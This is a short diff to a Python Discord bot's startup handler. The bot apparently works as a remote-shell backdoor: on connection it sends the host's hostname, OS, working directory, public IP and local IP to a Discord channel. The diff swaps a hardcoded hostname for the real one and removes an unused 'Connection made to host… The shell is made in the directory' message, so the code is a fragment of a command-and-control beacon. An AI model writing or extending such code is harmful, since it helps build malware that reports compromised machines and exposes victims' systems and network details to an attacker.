@@ -44,7 +44,7 @@ async def on_ready():
 
     embed.add_field(
         name="Host",
-        value=f"Host is `debian` running `{OS}`",
+        value=f"Host is `{hostname}` running `{OS}`",
         inline=False
     )
 
@@ -65,8 +65,6 @@ async def on_ready():
         value=f"`{local_ip}`",
         inline=False
     )
-
-    connection_message = f"Connection made to host: `{hostname}` running {OS}\nThe shell is made in the directory: `{Dir}`\nPublic IP: `{public_ip}`\nLocal IP: `{local_ip}`"
 
     await channel.send(embed=embed)
 
